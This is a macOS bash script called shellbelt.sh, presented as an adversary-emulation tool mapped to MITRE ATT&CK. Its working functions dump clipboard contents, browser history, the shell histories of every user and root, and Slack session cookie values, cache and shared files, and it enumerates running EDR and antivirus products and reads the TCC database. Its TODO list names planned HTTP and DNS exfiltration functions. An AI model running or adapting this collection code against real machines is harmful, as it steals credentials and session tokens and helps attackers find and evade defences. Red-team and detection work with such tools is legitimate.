# =====================================
# SwiftBelt Shell Version (ShellBelt)
# =====================================

# Script Name: shellbelt.sh
# Platform: macOS
# MITRE ATT&CK Techniques: Various (depends on the command invoked)
# Author: @darmado | x.com/darmad0
# Date: $(date +%Y-%m-%d)
# Version: 0.8 alpha

# Description:
# shellbelt.sh is a macOS security testing script inspired by SwiftBelt. 
# It is designed to emulate various adversary techniques and gather telemetry 
# on macOS systems based on the MITRE ATT&CK framework. The script provides 
# modular functionality to target different techniques such as process discovery, 
# browser history extraction, security tool detection, and more.
# Commands can be invoked by passing specific arguments, allowing the script 
# to run different modules based on the desired technique.

# Usage:
# ./shellbelt.sh [options]

# References:
# - MITRE ATT&CK: https://attack.mitre.org
# - SwiftBelt: https://github.com/cedowens/SwiftBelt
# - macOS Built-in Security Tools: [URL to relevant documentation]

# Notes:
# - shellbelt.sh is modular, allowing specific techniques to be run based on the arguments passed.
# - Ensure the script is run with the necessary permissions (sudo may be required for certain modules).

# TODO:
# - Implement the following functions:
#   - get_user()
#   - get_timestamp()
#   - log()
#   - log_and_append()
#   - log_output()
#   - setup_log()
#   - display_help()
#   - generate_random_key()
#   - encrypt_data()
#   - encode_output()
#   - exfiltrate_http()
#   - exfiltrate_dns()
#   - main()



# Function to display usage/help
usage() {
    echo "Usage: $0 [options]"
    echo "Options:"
    echo "-SystemInfo         : Pull back system information (e.g., hardware, software)"
    echo "-Clipboard          : Dump clipboard contents"
    echo "-RunningApps        : List all running applications"
    echo "-ListUsers          : List local user accounts"
    echo "-LaunchAgents       : List launch agents and daemons"
    echo "-BrowserHistory     : Pull browser history from Safari, Chrome, and Firefox"
    echo "-SlackTokens        : Read and label Slack tokens (Cookies)"
    echo "-SlackPreferences   : Read Slack preferences"
    echo "-SlackCache         : Read Slack cache data"
    echo "-SlackSharedFiles   : Read Slack shared files and metadata"
    echo "-BashHistory        : Read bash history"
    echo "-SecurityTools      : Check for common macOS security tools"
    echo "-EnumerateBrowsers  : List installed browsers (Safari, Chrome, Firefox)"
    echo "-h | --help         : Display this help menu"
}


# Function to safely check permissions (read, write, execute) for a file
# Other functions invoke it to avoid generating permission denied errors

check_permissions() {
    local filepath="$1"
    local mode="$2"

    if [ "$mode" = "r" ]; then
        if [ -r "$filepath" ]; then
            return 0  # Readable
        else
            return 1  # Not readable
        fi
    elif [ "$mode" = "w" ]; then
        if [ -w "$filepath" ]; then
            return 0  # Writable
        else
            return 1  # Not writable
        fi
    elif [ "$mode" = "x" ]; then
        if [ -x "$filepath" ]; then
            return 0  # Executable
        else
            return 1  # Not executable
        fi
    fi
}


# Function to enumerate installed browsers
enumerate_browsers() {
    echo "Checking installed browsers..."

    # Check if Safari is installed (Safari is default on macOS, so just check if the History file exists)
    if [ -d "/Applications/Safari.app" ]; then
        echo "Safari is installed."
    else
        echo "Safari is not installed."
    fi

    # Check if Chrome is installed
    if [ -d "/Applications/Google Chrome.app" ]; then
        echo "Google Chrome is installed."
    else
        echo "Google Chrome is not installed."
    fi

    # Check if Firefox is installed
    if [ -d "/Applications/Firefox.app" ]; then
        echo "Firefox is installed."
    else
        echo "Firefox is not installed."
    fi
}

# Function to handle system information retrieval
system_info() {
    echo "Gathering System Information..."
    system_profiler SPHardwareDataType SPSoftwareDataType
}

# Function to handle clipboard content retrieval
clipboard_content() {
    echo "Dumping Clipboard Contents..."
    pbpaste
}

# Function to list running applications
running_apps() {
    # Echo header for the columns
    echo -e "PID USER\t\tSTARTED\t\t\t    COMMAND"
    
    # Use ps to list running GUI apps with PID, USER, START TIME, and COMMAND
    ps -ax -o pid,user,lstart,comm | grep -i '.app/' | grep -v grep | awk '!seen[$0]++'
}


# Function to list users
list_users() {
    echo "Listing Local User Accounts..."
    dscl . list /Users
}

# Function to list launch agents and daemons
launch_agents() {
    echo "Listing Launch Agents and Daemons..."

    # System launch agents
    launch_agents_dir="/Library/LaunchAgents"
    if [ -d "$launch_agents_dir" ]; then
        check_permissions "$launch_agents_dir" "r"
        if [ $? -eq 0 ]; then
            ls "$launch_agents_dir"
        else
            echo "No read permission for system Launch Agents."
        fi
    else
        echo "System Launch Agents directory not found."
    fi

    # User launch agents
    user_launch_agents_dir=~/Library/LaunchAgents
    if [ -d "$user_launch_agents_dir" ]; then
        check_permissions "$user_launch_agents_dir" "r"
        if [ $? -eq 0 ]; then
            ls "$user_launch_agents_dir"
        else
            echo "No read permission for user Launch Agents."
        fi
    else
        echo "User Launch Agents directory not found."
    fi
}


# Function to extract browser history (Safari, Chrome, Firefox)
browser_history() {
    echo "Extracting browser history..."

    # Safari History
    safari_db=~/Library/Safari/History.db
    if [ -f "$safari_db" ]; then
        check_permissions "$safari_db" "r"
        if [ $? -eq 0 ]; then
            sqlite3 "$safari_db" "SELECT url, visit_time FROM history_visits INNER JOIN history_items ON history_visits.history_item = history_items.id;"
        else
            echo "No read permission for Safari history database."
        fi
    else
        echo "Safari history database not found."
    fi

    # Chrome History
    chrome_db=~/Library/Application\ Support/Google/Chrome/Default/History
    if [ -f "$chrome_db" ]; then
        check_permissions "$chrome_db" "r"
        if [ $? -eq 0 ]; then
            sqlite3 "$chrome_db" "SELECT url, last_visit_time FROM urls;"
        else
            echo "No read permission for Chrome history database."
        fi
    else
        echo "Chrome history database not found."
    fi

    # Firefox History
    firefox_db=~/Library/Application\ Support/Firefox/Profiles/*.default-release/places.sqlite
    if [ -f "$firefox_db" ]; then
        check_permissions "$firefox_db" "r"
        if [ $? -eq 0 ]; then
            sqlite3 "$firefox_db" "SELECT url, last_visit_date FROM moz_places;"
        else
            echo "No read permission for Firefox history database."
        fi
    else
        echo "Firefox history database not found."
    fi
}


# Function to check bash and zsh history for all users, including root
bash_history_all_users() {
    # Check for bash and zsh history files in the /Users directory
    for homedir in /Users/*; do
        if [ -d "$homedir" ]; then
            # Check bash history
            if [ -f "$homedir/.bash_history" ]; then
                check_permissions "$homedir/.bash_history" "r"
                if [ $? -eq 0 ]; then
                    echo "Found readable bash history for: $homedir"
                    cat "$homedir/.bash_history"
                else
                    echo "No read permission for bash history: $homedir"
                fi
            fi

            # Check zsh history
            if [ -f "$homedir/.zsh_history" ]; then
                check_permissions "$homedir/.zsh_history" "r"
                if [ $? -eq 0 ]; then
                    echo "Found readable zsh history for: $homedir"
                    cat "$homedir/.zsh_history"
                else
                    echo "No read permission for zsh history: $homedir"
                fi
            fi
        fi
    done

    # Check root user history (if script is run as root)
    if [ "$(id -u)" -eq 0 ]; then
        # Check root's bash history
        if [ -f "/var/root/.bash_history" ]; then
            check_permissions "/var/root/.bash_history" "r"
            if [ $? -eq 0 ]; then
                echo "Found readable bash history for root"
                cat /var/root/.bash_history
            else
                echo "No read permission for root's bash history"
            fi
        fi

        # Check root's zsh history
        if [ -f "/var/root/.zsh_history" ]; then
            check_permissions "/var/root/.zsh_history" "r"
            if [ $? -eq 0 ]; then
                echo "Found readable zsh history for root"
                cat /var/root/.zsh_history
            else
                echo "No read permission for root's zsh history"
            fi
        fi
    else
        echo "Not running as root, skipping root history check."
    fi
}

check_permissions() {
    file_path="$1"
    permission="$2"
    
    if [ ! -r "$file_path" ]; then
        echo "$(date) - WARN - Insufficient permissions to read $file_path"
        return 1
    else
        return 0
    fi
}

security_tools() {
    total_checks=0
    installed_tools=0
    active_tools=0

    # List of process names to check
    process_names=(
      "SentinelAgent"
      "falconctl"
      "CbOsxSensorService"
      "SophosScanD"
      "CylanceSvc"
      "mfetpd"
      "iCoreService"
      "eset_daemon"
      "kav"
      "bdservicehost"
      "XProtectService"
      "MRT"
      "com.apple.security.syspolicyd"
      "com.apple.trustd"
      "com.avast.daemon"
      "NortonSecurity"
      "WebrootSecureAnywhere"
      "f-secure"
      "Malwarebytes"
      "cyserver"
      "xagt"
      "SophosHome"
      "Avira"
      "VirusBarrier"
      "F-Secure-Safe"
      "McAfeeSecurity"
      "Symantec"
      "wdav"
      "kesl"
      # Objective-See Tools
      "LuLu"
      "DoNotDisturb"
      "BlockBlock"
      "RansomWhere"
      "KnockKnock"
      "OverSight"
      "WhatsYourSign"
    )

    # List of vendor file paths to check
    vendor_files=(
      "/Applications/SentinelOne.app"
      "/Library/CS/falconctl"
      "/Applications/CarbonBlack/CbOsxSensorService"
      "/Library/Sophos Anti-Virus"
      "/Library/Application Support/Cylance/Desktop/CylanceUI.app"
      "/usr/local/McAfee"
      "/Library/Application Support/TrendMicro"
      "/Library/Application Support/com.eset.remoteadministrator.agent"
      "/Library/Application Support/Kaspersky"
      # Objective-See Tools
      "/Applications/LuLu.app"
      "/Applications/DoNotDisturb.app"
      "/Applications/BlockBlock.app"
      "/Applications/RansomWhere.app"
      "/Applications/KnockKnock.app"
      "/Applications/OverSight.app"
      "/Applications/WhatsYourSign.app"
    )

    # Check for running security tool processes
    for process in "${process_names[@]}"; do
        total_checks=$((total_checks+1))
        if pgrep -f "$process" > /dev/null; then
            active_tools=$((active_tools+1))
            echo "$(date) - ALERT - Active security tool found: $process"
            echo "Details:"
            ps aux | grep -i "$process" | grep -v grep
            echo "" # Add spacing between results
        fi
    done

    # Check for vendor-installed applications
    for file in "${vendor_files[@]}"; do
        total_checks=$((total_checks+1))
        if [ -d "$file" ]; then
            echo "$(date) - WARN - Security tool installed: $file"
            installed_tools=$((installed_tools+1))
        fi
    done

    # Check for macOS built-in security tools and show configurations if active
    if spctl --status | grep -q enabled; then
        echo "$(date) - ALERT - Gatekeeper is enabled"
        active_tools=$((active_tools+1))
        echo "Gatekeeper Configuration:"
        spctl --assess --verbose /Applications/Safari.app
        echo "" # Add spacing between results
    fi

    # Check Firewall configuration and permissions
    firewall_file="/Library/Preferences/com.apple.alf.plist"
    if [ "$(defaults read /Library/Preferences/com.apple.alf globalstate)" == "1" ]; then
        if check_permissions "$firewall_file" "r"; then
            echo "$(date) - ALERT - Firewall is enabled"
            active_tools=$((active_tools+1))
            echo "Firewall Configuration:"
            sudo /usr/libexec/ApplicationFirewall/socketfilterfw --getglobalstate
            sudo /usr/libexec/ApplicationFirewall/socketfilterfw --listapps
            echo "" # Add spacing between results
        fi
    fi

    # Check File Quarantine (Placeholder for checking file attributes)
    if [ "$(xattr -l /path/to/quarantined/file | grep com.apple.quarantine)" ]; then
        echo "$(date) - ALERT - File Quarantine is enabled"
        active_tools=$((active_tools+1))
        echo "" # Add spacing between results
    fi

    # Check XProtect configuration
    xprotect_file="/System/Library/CoreServices/XProtect.bundle/Contents/Resources/XProtect.meta.plist"
    if pgrep XProtectService > /dev/null; then
        if check_permissions "$xprotect_file" "r"; then
            echo "$(date) - ALERT - XProtect is running"
            active_tools=$((active_tools+1))
            echo "XProtect Configuration:"
            defaults read "$xprotect_file"
            echo "" # Add spacing between results
        fi
    fi

    # Check MRT configuration
    mrt_file="/System/Library/CoreServices/MRT.app/Contents/Info.plist"
    if pgrep MRT > /dev/null; then
        if check_permissions "$mrt_file" "r"; then
            echo "$(date) - ALERT - Malware Removal Tool (MRT) is running"
            active_tools=$((active_tools+1))
            echo "MRT Configuration:"
            defaults read "$mrt_file"
            echo "" # Add spacing between results
        fi
    fi

    # Check TCC configuration
    tcc_file="/Library/Application Support/com.apple.TCC/TCC.db"
    if pgrep syspolicyd > /dev/null; then
        if check_permissions "$tcc_file" "r"; then
            echo "$(date) - ALERT - TCC (Transparency, Consent, and Control) is active"
            active_tools=$((active_tools+1))
            echo "TCC Configuration:"
            sqlite3 "$tcc_file" "SELECT client, service, allowed, prompt_count FROM access"
            echo "" # Add spacing between results
        fi
    fi

    # Summary
    echo "$(date) - INFO - Total checks: $total_checks, Installed tools: $installed_tools, Active tools: $active_tools"
}



#Slack stuff
slack_tokens() {
    # Locate Slack's cookies file
    slack_cookies_file=$(find "$HOME/Library/Application Support/Slack" -name "Cookies" 2>/dev/null)
    if [ -z "$slack_cookies_file" ]; then
        echo "Error: Slack cookies file not found."
        return 1
    fi

    # Check permissions to read the cookies file
    check_permissions "$slack_cookies_file" "r"
    if [ $? -ne 0 ]; then
        echo "Error: No read permission for $slack_cookies_file."
        return 1
    fi

    # Read all Slack cookies (not just session cookies)
    echo "Reading Slack session cookies:"
    sqlite3 "$slack_cookies_file" "SELECT host_key, name, value FROM cookies WHERE host_key LIKE '%slack.com%';"
}


slack_preferences() {
    slack_data_dir=$(find "$HOME/Library/Application Support" -type d -name "Slack" 2>/dev/null)
    if [ -z "$slack_data_dir" ]; then
        echo "Error: Slack data directory not found."
        return 1
    fi

    # Target the preferences file
    preferences_file=$(find "$slack_data_dir" -name "Preferences" 2>/dev/null)
    if [ -f "$preferences_file" ]; then
        check_permissions "$preferences_file" "r"
        if [ $? -eq 0 ]; then
            cat "$preferences_file" 2>/dev/null
        else
            echo "Error: No read permission for $preferences_file."
        fi
    else
        echo "Error: Preferences file not found."
    fi
}

slack_cache() {
    
    slack_data_dir=$(find "$HOME/Library/Application Support" -type d -name "Slack" 2>/dev/null)
    if [ -z "$slack_data_dir" ]; then
        echo "Error: Slack data directory not found."
        return 1
    fi

    # Target the cache directory
    cache_dir=$(find "$slack_data_dir" -type d -name "Cache" 2>/dev/null)
    if [ -d "$cache_dir" ]; then
        check_permissions "$cache_dir" "r"
        if [ $? -eq 0 ]; then
            find "$cache_dir" -type f -exec cat {} + 2>/dev/null
        else
            echo "Error: No read permission for $cache_dir."
        fi
    else
        echo "Error: Cache directory not found."
    fi
}

slack_shared_files() {
    slack_data_dir=$(find "$HOME/Library/Application Support" -type d -name "Slack" 2>/dev/null)
    if [ -z "$slack_data_dir" ]; then
        echo "Error: Slack data directory not found."
        return 1
    fi

    # Search for shared storage files or metadata
    shared_storage_file=$(find "$slack_data_dir" -name "SharedStorage" 2>/dev/null)
    if [ -z "$shared_storage_file" ]; then
        echo "Notice: No shared files or metadata found in Slack."
        return 1
    fi

    # Check permissions and read the shared storage file
    check_permissions "$shared_storage_file" "r"
    if [ $? -eq 0 ]; then
        cat "$shared_storage_file" 2>/dev/null
    else
        echo "Error: No read permission for $shared_storage_file."
    fi
}


slack_websocket() {
    slack_data_dir=$(find "$HOME/Library/Application Support" -type d -name "Slack" 2>/dev/null)
    if [ -z "$slack_data_dir" ]; then
        echo "Error: Slack data directory not found."
        return 1
    fi

    # If there's any WebSocket-related file (adjust as needed)
    websocket_file=$(find "$slack_data_dir" -name "TransportSecurity" 2>/dev/null)
    if [ -f "$websocket_file" ]; then
        check_permissions "$websocket_file" "r"
        if [ $? -eq 0 ]; then
            cat "$websocket_file" 2>/dev/null
        else
            echo "Error: No read permission for $websocket_file."
        fi
    else
        echo "Error: WebSocket-related file not found."
    fi
}


# ================================
# Argument Parsing
# ================================
if [ $# -eq 0 ]; then  
    usage
    exit 1
fi

while [ "$1" != "" ]; do
    case $1 in
       -SlackTokens )           slack_tokens
                                ;;
       -SlackPreferences )      slack_preferences
                                ;;
       -SlackCache )            slack_cache
                                ;;
       -SlackSharedFiles )      slack_shared_files
                                ;;
       -SlackWebSocket )        slack_websocket
                                ;;
        -SystemInfo )           system_info
                                ;;
        -Clipboard )            clipboard_content
                                ;;
        -RunningApps )          running_apps
                                ;;
        -ListUsers )            list_users
                                ;;
        -LaunchAgents )         launch_agents
                                ;;
        -BrowserHistory )       browser_history
                                ;;
        -BashHistory )          bash_history_all_users
                                ;;
        -SecurityTools )        security_tools
                                ;;
        -EnumerateBrowsers )    enumerate_browsers
                                ;;
        -h | --help )           usage
                                exit
                                ;;
        * )                     usage
                                exit 1
    esac
    shift
done
